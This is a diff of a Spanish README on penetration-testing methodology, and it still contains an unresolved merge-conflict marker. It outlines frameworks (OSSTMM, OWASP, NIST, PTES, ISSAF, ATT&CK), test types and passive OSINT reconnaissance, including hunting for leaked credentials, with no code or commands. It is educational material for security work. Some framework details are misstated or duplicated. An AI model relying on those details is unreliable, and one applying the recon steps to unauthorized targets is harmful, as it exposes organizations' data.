@@ -1,6 +1,8130 @@
+<<<<<<< HEAD
 Ciberseguridad
 
 RED
 
 
 ![red](https://github.com/user-attachments/assets/e4cb1666-0174-4565-bcfc-7f9bd61250b4)
+=======
+<p align="center">
+
+  <img src="https://i.postimg.cc/j5knS9Sw/Pentesting.jpg" alt="Descripción de la imagen">
+</p>
+
+
+<!--horizontal divider(gradiant)-->
+<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">
+
+<!--h1 without bottom border-->
+<div id="user-content-toc">
+  <ul align="center">
+    <summary><a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=45&pause=1000&color=FF0000&width=700&height=90&lines=PRUEBAS+DE+PENETRACI%C3%93N" alt="Typing SVG" /></a></summary>
+  </ul>
+</div>
+
+
+<!-------------------------------------- ## FASE 0 Preparacion--------------------------------------------->
+
+<h2> :arrow_right: Alcance </h2>
+
+<p> Antes de comenzar una prueba de penetración, se lleva a cabo una conversación formal entre el evaluador y el propietario del sistema. Se acuerdan las diversas herramientas, técnicas y sistemas que se probarán. Esta conversación constituye el alcance del acuerdo de prueba de penetración y determinará el desarrollo de la prueba. </p>
+
+<p> Se trata de recopilar informacion util, pero no de recopilar toda la informacion  </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/sgF1pzyr/image.png" alt="Descripción de la imagen">
+</p>
+
+
+
+
+
+<h2> :arrow_right: Etapas </h2>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/hjGxc5dw/0-1.png" alt="Descripción de la imagen">
+
+</p>
+
+
+</br>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/x8pDHjgX/opc-1.png" alt="Descripción de la imagen">
+
+</p>
+
+
+</br>
+
+<h2> :arrow_right:&nbsp; Metodología / Penetration Testing Frameworks </h2>
+
+
+
+<p> Un marco de pruebas de penetración es una metodología estructurada que guía a los profesionales de seguridad a través de cada etapa de un compromiso, desde la planificación y el alcance iniciales hasta la explotación, los informes y la validación de la remediación </p>
+
+
+
+<h2> :white_check_mark: &nbsp; OSSTMM  </h2>
+<p> Enfoque científico basado en métricas para las pruebas de seguridad  </p>
+
+
+<p> El Manual de Metodología de Pruebas de Seguridad de Código Abierto proporciona un marco detallado de estrategias de prueba para sistemas, software, aplicaciones, comunicaciones y el aspecto humano de la ciberseguridad </p>
+<p> La metodología se centra principalmente en cómo se comunican estos sistemas, aplicaciones, por lo que incluye una metodología para:  </p>
+
+
+<p><b> • &nbsp; Telecomunicaciones (teléfonos, VoIP, etc.) </b></p>
+<p><b> • &nbsp; Redes cableadas  </b></p>
+<p><b> • &nbsp; Comunicaciones inalámbricas</b></p>
+
+
+<p>OSSTMM organiza pruebas alrededor de cinco canales de seguridad, reflejando su filosofía de que la seguridad no es sólo un problema de red:</p>
+
+<p><b>Seguridad Humana (HUMSEC):</b> Ingeniería socialy vulnerabilidades del factor humano.</p>
+<p><b>Seguridad física (PHYSSEC):</b> Controles de acceso físico, desde lectores de insignias hasta tailgating.</p>
+<p><b>Comunicaciones inalámbricas (SPECSEC):</b> Wi-Fi, Bluetooth, RFID y otras señales electromagnéticas.</p>
+<p><b>Telecomunicaciones (COMSEC):</b> Sistemas telefónicos, VoIP, fax e infraestructura de módem.</p>
+<p><b>Redes de datos (DATASEC):</b> Servicios de red, firewalls y protocolos de capa de aplicación.</p>
+
+
+<h3> :radio_button: &nbsp; Fases </h3>
+
+<p>El ciclo de pruebas OSSTMM tiene cuatro fases.</p>
+
+
+<p><b> • &nbsp; Fase 1: Inducción</b> cubre enumeración y verificación. Mapeas lo que existe y confirmas que es real. (Consulta DNS, certificados, subdominios) Luego verifica que cada activo esté activo y responda. El resultado es un inventario confirmado del entorno objetivo.</p>
+
+<p><b> • &nbsp; Fase 2: Interacción  </b> Cubre la calificación y cuantificación. Activos verificados y evalúa su relevancia (te conectas a cada servicio, identificas su tecnología y cuantificas la exposición) Estos hallazgos 
+alimentan directamente el cálculo de la superficie de ataque.</p>
+
+<p><b> • &nbsp; Fase 3: Investigación</b> Cubre la escalada de privilegios y la escalada de verificación (Se prueba si la exposición medida se puede convertir en acceso no autorizado.) </p>
+
+<p><b> • &nbsp; Fase 4: Intervención</b>Cubre cuarentena, auditoría y incitación (Aborda los hallazgos y examina el entorno de control más amplio)</p>
+
+
+</br>
+
+
+<h2> :white_check_mark: &nbsp; OWASP </h2>
+<p> Enfoque científico basado en métricas para las pruebas de seguridad  </p>
+
+<p> Guía de pruebas de seguridad web (WSTG) " es un marco impulsado por la comunidad y actualizado con frecuencia que se utiliza únicamente para probar la seguridad de las aplicaciones y servicios web. </p>
+
+<p>El WSTG adopta una enfoque basado en riesgos: las vulnerabilidades se priorizan en función de su explotabilidad e impacto, no simplemente se catalogan. Este enfoque significa que el marco ayuda a los evaluadores a centrar sus esfuerzos donde más importan.</p>
+
+
+<h3> :radio_button: &nbsp; Fases: Seguridad en todo el SDLC </h3>
+
+<p> Alinea las pruebas en cinco fases del Ciclo de vida del desarrollo de software (SDLC), incorporando seguridad desde la planificación inicial hasta el mantenimiento posterior al lanzamiento .</p>
+
+
+<p><b> • &nbsp; Fase 1: Antes de que comience el desarrollo</b> Los requisitos de seguridad y las obligaciones regulatorias se establecen de antemano.</p>
+
+<p><b> • &nbsp; Fase 2: Durante la definición y el diseño </b> Se revisa la arquitectura de la aplicación para detectar fallas de seguridad antes de escribir cualquier código</p>
+
+<p><b> • &nbsp; Fase 3: Durante el desarrollo</b> El código se examina mediante tutoriales y revisiones </p>
+
+<p><b> • &nbsp; Fase 4: Durante el despliegue.</b> Los controles de seguridad se verifican en el entorno de producción</p>
+
+<p><b> • &nbsp; Fase 5: Durante el mantenimiento y las operaciones</b> La seguridad se mantiene después del lanzamiento mediante controles de salud periódicos, especialmente después de las actualizaciones</p>
+
+
+<p><b>NOTA</b> La mayor fortaleza del WSTG es su Cobertura exhaustiva y práctica. Con más de 90 casos de prueba, cada uno de los cuales contiene procedimientos específicos y resultados esperados, ofrece a los evaluadores una hoja de ruta concreta en lugar de principios abstractos</p>
+
+
+</br>
+
+
+<h3> :white_check_mark: &nbsp; NIST SP 800-115 </h3>
+
+<p> El Marco de Ciberseguridad del NIST es un marco popular utilizado para mejorar los estándares de ciberseguridad de una organización y gestionar el riesgo de ciberamenazas. Este marco merece una mención honorífica debido a su popularidad y detalle </p>
+<p> El marco proporciona directrices sobre controles de seguridad y parámetros de referencia para el éxito de organizaciones desde infraestructuras críticas (centrales eléctricas, etc.) hasta las comerciales. Incluye una sección limitada sobre directrices estándar para la metodología que debe seguir un evaluador de penetración.</p>
+
+
+<p> Este marco se basa en tres objetivos fundamentales </p>
+
+
+<p>1 &nbsp; Identificar vulnerabilidades en sistemas, redes y aplicaciones </p>
+<p>2 &nbsp; Validar los controles de seguridad comprobando si funcionan según lo previsto en condiciones adversas. </b></p>
+<p>3 &nbsp; Evaluar la explotabilidad simulando escenarios de ataque reales para determinar si un agente malintencionado puede realmente aprovechar las debilidades identificadas</b></p>
+
+
+
+<h3> :radio_button: &nbsp; Fases </h3>
+
+
+
+<p><b> • &nbsp; Fase 1: Planificacion</b> Antes de comenzar cualquier prueba, se definen y documentan formalmente los objetivos, el alcance y las reglas de participación </p>
+
+<p><b> • &nbsp; Fase 2: Ejecución  </b> se llevan a cabo las pruebas activas. La norma NIST SP 800-115 agrupa las actividades de ejecución en cuatro categorías de técnicas: </p>
+
+
+<p><b>:white_check_mark: 1 &nbsp; Técnicas de revisión: </b>  examen de la documentación, las políticas, las configuraciones del sistema y los conjuntos de reglas.  </p>
+<p><b>:white_check_mark: 2 &nbsp; Identificación y análisis de objetivos: </b>  Detección y caracterización de hosts activos, puertos abiertos y servicios en ejecución </p>
+<p><b>:white_check_mark: 3 &nbsp; Validación de vulnerabilidades específicas:</b> Confirmar que las debilidades identificadas son reales y explotables, y no falsos positivos.</p>
+<p><b>:white_check_mark: 4 &nbsp; Pruebas de penetración:</b> Simulación de ataques maliciosos para evaluar el alcance de la explotación posible </p>
+
+
+<p><b> • &nbsp; Fase 3: Post-Prueba</b> El enfoque se centra en analizar los resultados, priorizar los riesgos y ofrecer estrategias de remediación viables.</p>
+
+
+</br>
+
+
+<h3> :white_check_mark: &nbsp; PTES </h3>
+
+<p> Estándar de ejecución de pruebas de penetración (PTES). Fue desarrollado por un grupo de profesionales de seguridad experimentados con un objetivo específico: definir cómo es una prueba de penetración real, de extremo a extremo. Donde otros marcos se centran en qué para probar o cómo Para medir, PTES se centra en cómo fluye el compromiso De principio a fin. </p>
+
+<p> PTES está organizado en siete fases que se asignan directamente al ciclo de vida de una prueba de penetración.  </p>
+
+
+
+<h3> :radio_button: &nbsp; Fases </h3>
+
+
+<p><b> • &nbsp; Fase 1: Interacciones previas al compromiso</b> Esto es todo lo que sucede antes de que comiencen las pruebas. Usted define el alcance con el director de TI, El PTES se detalla aquí en particular porque el alcance poco claro es la principal fuente de disputas legales y profesionales en las pruebas de penetración. </p>
+
+<p><b> • &nbsp; Fase 2: Recopilación de inteligencia. </b> Recopila información utilizando técnicas tanto pasivas como activas. El reconocimiento pasivo incluye recopilar direcciones de correo electrónico de empleados de LinkedIn, descubrir subdominios a través de registros de transparencia de certificados y revisar ofertas de trabajo que revelan pilas de tecnología ("buscar un DBA con experiencia en Oracle 19c"). El reconocimiento activo implica DNSenumeración y escaneo de redes dentro del alcance acordado. PTES distingue entre estos niveles porque la profundidad de la recopilación de inteligencia determina directamente la calidad de las fases posteriores.</p>
+
+
+<p><b> • &nbsp; Fase 3: Modelado de amenazas.</b> Utilizando la inteligencia recopilada, identificas los objetivos más valiosos y las rutas de ataque más probables. Esta fase garantiza que su esfuerzo de prueba esté dirigido por lógica adversaria en lugar de escaneo aleatorio. </p>
+
+<p><b> • &nbsp; Fase 4: Análisis de vulnerabilidades.</b> Identifica sistemáticamente debilidades que podrían habilitar las rutas de ataque desde tu modelo de amenaza. PTES enfatiza que el análisis de vulnerabilidad incluye tanto escaneo automatizado como verificación manual para eliminar falsos positivos.</p>
+
+<p><b> • &nbsp; Fase 5: Explotacion. </b> Intentas explotar las vulnerabilidades confirmadas. PTES enfatiza que la explotación debe tener un propósito: el objetivo es demostrar el impacto comercial, no "hacer estallar cajas" solo por hacerlo.</p>
+
+<p><b> • &nbsp; Fase 6: Post-Explotación </b> Después de obtener acceso, usted determina el impacto en el mundo real. PTES trata la posexplotación como la fase en la que los hallazgos técnicos se traducen en riesgo comercial</p>
+
+<p><b> • &nbsp; Fase 7: Informes </b> Los resultados se presentan en un informe estructurado teniendo en cuenta dos públicos. El resumen ejecutivo comunica el riesgo comercial en un lenguaje sencillo. El informe técnico proporciona los detalles que el equipo de TI para corregir cada hallazgo: pasos de explotación exactos, hosts afectados, capturas de pantalla de evidencia y orientación de remediación priorizada.</p>
+
+
+</br>
+
+
+<h3> :white_check_mark: &nbsp; ISSAF </h3>
+
+<p> El Marco de evaluación de la seguridad de los sistemas de información (ISSAF), es un marco de pruebas de penetración de código abierto diseñado para evaluar la seguridad de redes, sistemas y aplicaciones. La última versión, ISSAF v0.2.1, se publicó alrededor de 2006 y el marco ya no se mantiene activamente. </p>
+
+<p> Modelo de evaluación de nueve pasos es una de las representaciones más claras de cómo un atacante progresa a través de un entorno objetivo. Refleja la lógica de una amenaza persistente avanzada, que pasa sistemáticamente del reconocimiento inicial al acceso persistente y la eliminación de pruebas. (Cadena de muerte cibernética / Cyber Kill Chain ) </p>
+
+
+
+<h3> :radio_button: &nbsp; Fases </h3>
+
+
+<p><b> • &nbsp; Fase 1: Planificación y preparación</b> Esta fase establece los límites del compromiso. Definir el alcance, establecer protocolos de escalada y contactos de emergencia, identificar limitaciones y acuerde el conjunto de herramientas apropiado para la evaluación. </p>
+
+
+<p><b> • &nbsp; Fase 2: Evaluación</b> Se divide en nueve pasos. Cada paso se basa en el anterior, simulando cómo progresaría un adversario real a través del entorno. </p>
+
+
+
+<p><b>:white_check_mark: 1 &nbsp; Recopilación de información: </b>  Recopilar datos disponibles públicamente: WHOIS, perfiles de empleados en LinkedIn y referencias tecnológicas en ofertas de trabajo todo alimenta su comprensión del objetivo.</p>
+
+<p><b>:white_check_mark: 2 &nbsp; Mapeo de redes: </b> Mapee la topología de la red en vivo. Descubra la gama de IPs, el portal del proyecto, una VPN, una puerta de enlace o servidor de correo.</p>
+
+<p><b>:white_check_mark: 3 &nbsp; Identificación de vulnerabilidades:</b>  Escanee los activos mapeados en busca de debilidades. Como una consola administrativa expuesta sin autenticación. </p>
+
+</br>
+
+<p><b>:white_check_mark: 4 &nbsp; Penetración: </b>  Intentar explotación inicial. </p>
+
+<p><b>:white_check_mark: 5 &nbsp; Obtención de acceso y escalada de privilegios:</b> Escalar desde el acceso inicial a privilegios más altos. </p>
+
+<p><b>:white_check_mark: 6 &nbsp; Enumerando más: </b> Con acceso elevado, enumere lo que ahora es accesible. Decubra repositorios que contienen APIclaves, cadenas de conexión a bases de datos o código fuente del proyecto </p>
+
+<p><b>:white_check_mark: 7 &nbsp; Comprometer a usuarios/sitios remotos (movimiento lateral): </b> Muévete lateralmente a otros sistemas. Utilizando las credenciales recopiladas, accede a varias estaciones de trabajo o servidores de correo interno.</p>
+
+</br>
+
+<p><b>:white_check_mark: 8 &nbsp; Mantener el acceso:</b> Establecer acceso persistente para demostrar que un atacante real podría conservar su posición. Documenta (sin implementar realmente) cómo se podría colocar una puerta trasera, que persiste durante los reinicios e implementaciones del sistema. </p>
+
+<p><b>:white_check_mark: 9 &nbsp; Cubriendo pistas: </b> Demuestre cómo un atacante borraría la evidencia. Documenta qué registros capturaron tu actividad e identifica brechas en el registro que permitirían que un adversario real operara sin ser detectado.</p>
+
+
+
+<p>Nota: Los pasos 1 a 3 son reconocimiento y análisis, los pasos 4 a 7 son compromiso activo y los pasos 8 a 9 abordan persistenciay sigilo.</p>
+
+
+<p><b> • &nbsp; Fase 3: Informes y limpieza</b> Recopila los hallazgos en un informe estructurado y realiza la limpieza lo cual implica eliminar cualquier artefacto de prueba, revocar cualquier cuenta temporal creada durante la prueba y confirmar con el equipo de tecnologia que no quedan residuos de prueba en su entorno. </p>
+
+
+</br>
+
+
+<h3> :white_check_mark: &nbsp; MITRE ATT&CK </h3>
+
+
+<p> ATT&CK significa Tácticas, técnicas y procedimientos comunes adversarios. No es un marco tradicional de pruebas de penetración. Es una base de conocimientos del comportamiento del adversario, construido a partir de observaciones del mundo real de cómo operan los actores de amenazas.  </p>
+
+
+<p> ATT&CK significa Tácticas, técnicas y procedimientos comunes adversarios. No es un marco tradicional de pruebas de penetración. Es una base de conocimientos del comportamiento del adversario, construido a partir de observaciones del mundo real de cómo operan los actores de amenazas.  </p>
+
+
+<h3> :radio_button: &nbsp; Tácticas, técnicas y procedimientos </h3>
+
+
+<p>ATT&CK está organizado como un matriz.  
+
+
+Las columnas representan las tácticas, que son los objetivos de alto nivel del adversario, el por qué detrás de una acción. La matriz empresarial actual incluye 14 tácticas, que progresan desde el acceso inicial hasta la ejecución persistencia, escalada de privilegios, evasión de defensa, acceso a credenciales, descubrimiento, movimiento lateral, recolección, comando y control, exfiltración e impacto.
+
+Dentro de cada columna de táctica, el filas lista técnicas, que son los cómo, los métodos específicos que utiliza un adversario para lograr ese objetivo táctico.   </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/150h3vLp/175.png" alt="Descripción de la imagen">
+
+</p>
+
+<p> Ejemplo de como usar la Matriz de MITRE ATT&CK </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/JnWjM3vQ/176.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+</br>
+
+
+<h3> :white_check_mark: &nbsp; Otros Marcos Notables </h3>
+
+
+
+<h2> :white_check_mark: &nbsp; NCSC </h2>
+
+
+<p> El Marco de Evaluación Cibernética (CAF) es un marco extenso de catorce principios que se utilizan para evaluar el riesgo de diversas ciberamenazas y las defensas de una organización contra ellas </p>
+<p> El marco se aplica a organizaciones que realizan servicios y actividades de vital importancia, como infraestructuras críticas, banca, etc. Se centra principalmente en los siguientes temas y los evalúa:  </p>
+
+<p><b> • &nbsp; Seguridad de datos </b></p>
+<p><b> • &nbsp; Seguridad del sistema </b></p>
+<p><b> • &nbsp; Control de identidad y acceso </b></p>
+<p><b> • &nbsp; Resiliencia </b></p>
+<p><b> • &nbsp; Monitoreo </b></p>
+<p><b> • &nbsp; Planificación de respuesta y recuperación </b></p>
+
+
+</br>
+
+<h3> :white_check_mark: &nbsp; Clasificación de amenazas WASC</h3>
+
+
+<p>   Desarrollado por el Consorcio de Seguridad de Aplicaciones Web (WASC) como taxonomía para categorizar vulnerabilidades de aplicaciones web y tipos de ataques. Organiza las amenazas en categorías como autenticación insuficiente, fuga de información y abuso de funcionalidad.</p>
+
+
+
+</br>
+
+
+<h3> :white_check_mark: &nbsp; Matriz de controles en la nube de CSA (CCM)</h3>
+
+
+<p> publicado por el Alianza de Seguridad en la Nube (CSA) y proporciona un marco de controles de seguridad cibernética diseñado específicamente para entornos de computación en la nube. Mapea controles en 17 dominios, incluida la seguridad de datos, la gestión de identidad y acceso y la seguridad de la infraestructura, y los alinea con estándares importantes como ISO 27001 NIST, y PCI DSS. CCM no es una metodología de pruebas de penetración; es una Herramienta de gobernanza y cumplimiento que ayuda a las organizaciones a evaluar si sus proveedores y configuraciones de nube cumplen con los requisitos de seguridad.</p>
+
+
+</br>
+
+
+<h3> :white_check_mark: &nbsp; OWASP Guía de pruebas de seguridad de aplicaciones móviles (MASTG)</h3>
+ 
+
+<p> Proporciona casos de prueba detallados para Seguridad de aplicaciones Android e iOS, cubriendo áreas como almacenamiento de datos, implementación criptográfica, comunicación de red, interacción con la plataforma y calidad del código. Si su interacción implica probar una aplicación de banca móvil, una aplicación de portal para pacientes de atención médica o cualquier aplicación móvil orientada al cliente.</p>
+
+
+
+</br>
+
+
+<h3> :white_check_mark: &nbsp; PCI DSS Pautas para las pruebas de penetración</h3>
+ 
+
+<p> Se definen dentro del Estándar de seguridad de datos de la industria de tarjetas de pago, específicamente en Requisito 11.4 (PCI DSS v4.0), Estas directrices son mandatos regulatorios: cualquier organización que procese, almacene o transmita datos del titular de la tarjeta debe realizar pruebas de penetración que cumplan PCI DSS. Las directrices especifican que las pruebas deben cubrir tanto el perímetro externo como la red interna, deben realizarse al menos una vez al año y después de cambios significativos en la infraestructura, y deben validar la red segmentación y controles.</p>
+
+
+</br>
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/8cpWrp1r/177.png" alt="Descripción de la imagen">
+
+</p>
+
+
+<h3> :white_check_mark: &nbsp; Marco CBEST</h3>
+
+
+<p> Es un marco de pruebas de penetración basado en inteligencia de amenazas diseñado específicamente para instituciones financieras del Reino Unido</p
+
+</br>
+
+
+
+<h3> :radio_button: &nbsp; Elegir el marco adecuado </h3>
+
+
+<p> • &nbsp; Una evaluación de la aplicación web se alinea con la <b> OWASPWSTG </b></p>
+<p> • &nbsp; Una evaluación en una aplicacion movil requiere <b> OWASPMASTG </b></p>
+<p> • &nbsp; Una prueba de penetración de red de espectro completo se alinea naturalmente con <b> PTES u OSSTMM </b></p>
+<p> • &nbsp; Si el alcance abarca múltiples canales, incluidos factores físicos y humanos, el modelo de cinco canales de <b> OSSTMM </b> se vuelve particularmente relevante. </p>
+<p> • &nbsp; Si el cliente procesa datos de tarjetas de pago se debe usar <b> PCI DSS</b> </p>
+<p> • &nbsp; Si el cliente es una institución financiera del Reino Unido sujeta a la supervisión del Banco de Inglaterra, se podrá exigir <b> CBEST</b> </p>
+<p> • &nbsp; En EE. UU. Entornos de contratistas gubernamentales y federales. Cuando la regulación lo dicta, el evaluador se adapta. <b>  NISTSP 800-115 </b> </p>
+<p> • &nbsp; Cuando participan varios evaluadores o cuando los resultados deben compararse a lo largo de períodos de tiempo. Las métricas RAV de <b> OSSTMM </b> están diseñadas específicamente para esto, medir si nuestra postura de seguridad ha mejorado desde la prueba anterior</p>
+<p> • &nbsp;  <b> CBEST </b> exige capacidades de inteligencia sobre amenazas</p>
+
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/y8VwKKHP/191.png" alt="Descripción de la imagen">
+
+</p>
+
+</br>
+
+
+
+<h3> :white_check_mark: &nbsp; Cyber Kill Chain </h3>
+
+
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/ryDK7d1c/306.png" alt="Descripción de la imagen">
+
+</p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</br>
+
+<h2> :arrow_right: Tipos de pruebas de penetracion </h2>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/pd1VnWTc/0-2.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<h3> :white_check_mark: &nbsp; Pruebas de caja negra </h3>
+
+
+<p> Este proceso de prueba es un proceso de alto nivel en el que el evaluador no recibe ninguna información sobre el funcionamiento interno de la aplicación o el servicio
+
+El tester actúa como un usuario normal que prueba la funcionalidad y la interacción de la aplicación o software. Estas pruebas pueden implicar interactuar con la interfaz (es decir, con los botones) y comprobar si se obtiene el resultado esperado. No se requieren conocimientos de programación ni comprensión del programa para este tipo de pruebas.
+
+Las pruebas de caja negra aumentan significativamente la cantidad de tiempo dedicado durante la fase de recopilación y enumeración de información para comprender la superficie de ataque del objetivo. </p>
+
+
+<h3> :white_check_mark: &nbsp; Pruebas de caja gris </h3>
+
+<p> Este proceso de prueba es el más popular para cosas como las pruebas de penetración. Es una combinación de procesos de prueba de caja negra y de caja blanca. El evaluador tendrá un conocimiento limitado de los componentes internos de la aplicación o del software. Aun así, interactuará con la aplicación como si fuera un escenario de caja negra y luego usará su conocimiento de la aplicación para intentar resolver los problemas a medida que los encuentre
+
+Con las pruebas de caja gris, el conocimiento limitado proporcionado ahorra tiempo y, a menudo, se elige para superficies de ataque extremadamente bien endurecidas. </p>
+
+
+<h3> :white_check_mark: &nbsp; Pruebas de caja Blanca </h3>
+
+
+<p> Este proceso de prueba es un proceso de bajo nivel que generalmente realiza un desarrollador de software con conocimientos de programación y lógica de aplicaciones. El evaluador probará los componentes internos de la aplicación o del software y, por ejemplo, se asegurará de que funciones específicas funcionen correctamente y en un tiempo razonable
+
+El evaluador tendrá pleno conocimiento de la aplicación y su comportamiento esperado, lo que requiere mucho más tiempo que las pruebas de caja negra. El conocimiento completo en un escenario de pruebas de caja blanca proporciona un enfoque que garantiza la validación de toda la superficie de ataque.</p>
+
+
+
+<h2> :arrow_right: Enfoque de las pruebas de penetracion </h2>
+
+
+<h3> :white_check_mark: &nbsp; Pruebas de penetración de aplicaciones web </h3>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/pL2ML60N/217.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> Las pruebas de penetración de aplicaciones web se centran en encontrar brechas y debilidades en una aplicación web. Las pruebas generalmente se realizan desde la perspectiva del usuario interactuando con la interfaz de usuario de la aplicación y sus API. El objetivo es evaluar cómo la aplicación maneja la entrada del usuario, la autenticación, la autorización, las sesiones y el procesamiento de datos. Las debilidades de las aplicaciones web pueden tener un gran impacto en sus usuarios porque las aplicaciones web suelen estar expuestas a Internet.</p>
+
+
+<p> • <b> Autenticación:</b> Esta área se evalúa para detectar debilidades en el manejo de credenciales de la aplicación, política de contraseñas, mecanismos de bloqueo de cuentas, autenticación multifactor, implementación, protección contra ataques automatizados como fuerza bruta y robo de credenciales, flujo de restablecimiento de contraseñas y lógicas generales relacionadas con la autenticación.</p>
+
+<p> • <b> Autorización </b> se evalúa para detectar debilidades en el mecanismo de control de acceso de la aplicación, garantizando que los usuarios solo puedan acceder a recursos y realizar acciones permitidas por su función, y protección contra ataques de escalada de privilegios verticales y horizontales. </p>
+
+<p> • <b> Gestión de sesiones </b> Riesgos de fijación de sesión, invalidación de sesión después de cerrar sesión, cumplimiento del tiempo de espera inactivo, atributos de cookies seguros y protección contra falsificación de solicitudes entre sitios (CSRF). </p>
+
+<p> • <b> Validación de entrada y salida: </b> Se evalúa para detectar debilidades en los controles de manejo de datos de la aplicación, incluida la protección contra ataques de inyección, la validación del tipo de datos y el manejo de salida. </p>
+
+<p> • <b> Configuración de seguridad: </b> se evalúa para detectar brechas en las configuraciones del servidor y de la aplicación, incluidos encabezados de seguridad, comportamiento de manejo de errores, controles de limitación de velocidad, configuración criptográfica y exposición de servicios o características innecesarias</p>
+
+
+<h3> :white_check_mark: &nbsp; Pruebas de penetración de red </h3>
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/W3K5qX0Z/218.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+<p> Las pruebas de penetración de red se centran en encontrar vulnerabilidades en la infraestructura</p>
+
+<p> Se divide entre: </p>
+
+
+<h3> :radio_button: &nbsp; Red externa </h3>
+
+
+<p> se realizadesde la perspectiva de un usuario externo con poco o ningún acceso a la información sobre los sistemas expuestos externamente. Este tipo de evaluación se centra en la infraestructura externa, como servidores con conexión a Internet, firewalls, VPN, pasarelas y servicios de acceso remoto. El objetivo es evaluar cómo están expuestos estos sistemas y evaluar los controles de seguridad que los protegen contra usuarios no autorizados.</p>
+
+
+<h3> :radio_button: &nbsp; Red Interna </h3>
+
+
+<p> Es un escenario de "supuesta violación" en el que un actor de amenazas ya tiene acceso a un sistema en la red. Este tipo de evaluación evalúa lo que un atacante podría hacer a continuación, como moverse entre sistemas, aumentar privilegios o acceder a datos confidenciales. El objetivo es evaluar las relaciones de confianza, los controles de acceso y la segmentación de red. Identificar configuraciones débiles y determinar si los controles de seguridad pueden limitar el impacto de un compromiso.</p>
+
+
+<p> • <b> Mecanismos de autenticación:</b> se evalúa para detectar debilidades en los controles de autenticación a nivel de red, como la política de contraseñas, cumplimiento MFA, reutilización de credenciales, uso de credenciales predeterminadas y protección contra ataques a servicios como portales de administración, VPN, SSH, o PDR.</p>
+
+<p> • <b> Autorización y controles de acceso </b> se evalúa para detectar debilidades en los mecanismos de control de acceso a la red, garantizando que los usuarios y los sistemas solo puedan acceder a los recursos permitidos por su función o nivel de confianza. </p>
+
+<p> • <b> Segmentacion de red y relacion de confianza </b>  se evalúa para detectar debilidades en las relaciones de confianza entre usuarios y sistemas firewall reglas y controles de aislamiento. </p>
+
+<p> • <b> Configuración y gestión de parches </b> se evalúa para detectar brechas en las configuraciones y servicios de los dispositivos, como el uso de software obsoleto, configuración predeterminada insegura y protocolos de cifrado débiles. </p>
+
+
+
+
+
+<!-------------------------------------- ## FASE 1 Reconocimiento --------------------------------------------->
+
+<!--horizontal divider(gradiant)-->
+<img src="https://user-images.githubusercontent.com/73097560/115834477-dbab4500-a447-11eb-908a-139a6edaec5c.gif">
+
+</br>
+
+
+<div id="user-content-toc">
+  <ul align="center">
+    <summary><a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=42&pause=1000&color=F70000&width=600&height=85&lines=Fase+1.+Reconocimiento" alt="Typing SVG" /></a></summary>
+  </ul>
+</div>
+
+
+
+
+<p>Es el primer paso en cualquier intervención de hacking. Consiste en recopilar información sobre los sistemas o redes objetivo para comprender a fondo el entorno que se pretende evaluar  </p>
+
+<p> Por lo tanto su objetivo es construir un mapa del objetivo </p>
+
+
+<p align="center">
+
+  <img src="https://i.postimg.cc/Zqw789yc/mapp.png" alt="Descripción de la imagen">
+  
+</p>
+
+
+</br>
+
+
+<!-------------------------------------- ## FASE 1 Reconocimiento pasivo --------------------------------------------->
+
+</br>
+
+
+<div id="user-content-toc">
+  <ul align="right">
+    <summary><a href="https://git.io/typing-svg"><img src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=50&pause=1000&color=2C6ED4&width=700&height=350&lines=Reconocimiento+pasivo" alt="Typing SVG" /></a></summary>
+  </ul>
+</div>
+
+
+</br>
+
+
+
+<h2> 👨🏻‍💻 (No hay interacción directa con el objetivo) </h2>
+
+
+
+<p> La principal forma de lograrlo es mediante Inteligencia de Fuentes Abiertas (OSINT) , que consiste en recopilar información sobre nuestro objetivo 
+	de fuentes públicas, incluido el sitio web público de la organizacion </p>
+
+
+<p><b> • &nbsp; Identificar direcciones IP & la informacion DNS </b></p>
+<p><b> • &nbsp; informacion Registros DNS de solucionadores abiertos (A, MX, TXT, etc.). </b></p>
+<p><b> • &nbsp; Búsqueda de registros de transparencia de certificados (por ejemplo, crt.sh) en busca de subdominios y certificados emitidos </b></p>
+<p><b> • &nbsp; Identificar nombres de dominios & la información sobre la propiedad del dominio  </b></p>
+<p><b> • &nbsp; Identificar direcciones Email y perfiles de redes sociales </b></p>
+<p><b> • &nbsp; Identificar las tecnologias WEB utilizadas por el sitio </b></p>
+<p><b> • &nbsp; Leer noticias públicas, comunicados de prensa o documentos filtrados en sitios de pegado.</b></p>
+<p><b> • &nbsp; Comprobación de dispositivos expuestos a través de motores de búsqueda como Shodan o Censys.</b></p>
+<p><b> • &nbsp; Escanear repositorios públicos de GitHub en busca de credenciales codificadas o archivos de configuración.</b></p>
+
+
+</br>
+
+
+<h2> :arrow_right: Descubrimiento de contenido y huella del sitio WEB  </h2>
+
+
+<p> Cuando hablamos de descubrimiento de contenido, no hace referencia a las cosas obvias que podemos ver en un sitio web; se trata de las cosas que no se nos presentan inmediatamente y que no siempre estuvieron destinadas al acceso público. Este contenido podría ser, por ejemplo, páginas o portales destinados al uso del personal, versiones anteriores del sitio web, archivos de copia de seguridad, archivos de configuración, paneles de administración, etc. </p>
+
+
+<h3> Enfoques principales para el descubrimiento de contenido </h3>
+
+
+<p><b> :radio_button: &nbsp; Descubrimiento Manual: </b> contenido oculto usando robots.txt, mapa del sitio.xml, favicons, encabezados HTTP y análisis del marco</p>
